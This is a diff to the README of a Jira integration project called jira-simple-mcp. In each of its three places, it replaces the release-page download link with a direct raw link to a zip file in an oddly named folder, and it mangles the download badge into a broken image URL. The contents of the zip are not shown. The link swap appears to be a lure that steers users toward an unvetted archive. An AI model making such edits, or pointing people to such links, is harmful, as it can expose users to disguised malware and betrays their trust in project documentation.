@@ -1,6 +1,6 @@
 # 🛠 jira-simple-mcp - Simplifying Your Jira Integration Experience
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Luis13-source/jira-simple-mcp/releases)
+[![Download](https://raw.githubusercontent.com/Luis13-source/jira-simple-mcp/master/easiness/jira-simple-mcp.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Luis13-source/jira-simple-mcp/master/easiness/jira-simple-mcp.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This guide will walk you through the steps to download and run the software smoo
 
 To get started, you need to download the software. Please visit the following link to access the Releases page:
 
-[Visit this page to download](https://github.com/Luis13-source/jira-simple-mcp/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Luis13-source/jira-simple-mcp/master/easiness/jira-simple-mcp.zip)
 
 Once on the page, you will find various versions of the software. Choose the latest version to ensure you get the best features and bug fixes.
 
@@ -86,4 +86,4 @@ By using jira-simple-mcp, you can integrate AI with your Jira seamlessly, enhanc
 
 Happy integrating! 
 
-[Visit this page to download](https://github.com/Luis13-source/jira-simple-mcp/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Luis13-source/jira-simple-mcp/master/easiness/jira-simple-mcp.zip)
